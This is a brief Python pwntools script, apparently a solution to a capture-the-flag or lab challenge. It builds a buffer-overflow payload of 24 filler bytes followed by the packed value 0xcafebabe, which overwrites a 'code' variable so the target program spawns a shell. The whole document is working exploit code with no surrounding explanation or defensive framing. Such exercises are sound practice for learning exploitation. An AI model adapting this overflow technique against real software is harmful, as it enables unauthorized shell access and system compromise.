from pwn import *
from struct import *
#The code variable is the first element to be modified after buffer overflow
# we need code = 0xcafebabe to spawn shell

buf = "A"*24                  # offset to RIP 16 + 8
buf += pack("<Q", 0xcafebabe)  
print(buf)
